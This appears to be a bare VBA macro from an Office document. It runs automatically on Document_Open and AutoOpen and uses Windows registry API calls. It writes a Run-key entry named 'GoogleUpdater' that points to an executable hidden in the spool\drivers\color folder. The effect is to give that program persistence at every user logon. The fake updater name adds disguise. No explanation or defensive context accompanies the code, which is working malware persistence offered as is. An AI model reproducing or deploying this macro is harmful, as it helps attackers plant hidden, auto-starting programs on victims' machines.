Private Declare PtrSafe Function RegCreateKeyA Lib "advapi32.dll" ( _
    ByVal hKey As Long, _
    ByVal lpSubKey As String, _
    phkResult As Long _
) As Long

Private Declare PtrSafe Function RegSetValueExA Lib "advapi32.dll" ( _
    ByVal hKey As Long, _
    ByVal lpValueName As String, _
    ByVal Reserved As Long, _
    ByVal dwType As Long, _
    ByVal lpData As String, _
    ByVal cbData As Long _
) As Long

Private Declare PtrSafe Function RegCloseKeyA Lib "advapi32.dll" Alias "RegCloseKey" ( _
    ByVal hKey As Long _
) As Long

Sub Document_Open()
    reg
End Sub

Sub AutoOpen()
    reg
End Sub
      
Sub reg()
    ' create a run key entry
    Const HKEY_CURRENT_USER = &H80000001
    Const REG_SZ = 1
    
    Dim hKey, value
    value = "C:\Windows\System32\spool\drivers\color\GoogleUpdater.exe"
    RegCreateKeyA HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", hKey
    RegSetValueExA hKey, "GoogleUpdater", 0, REG_SZ, value, Len(value)
    RegCloseKeyA hKey
End Sub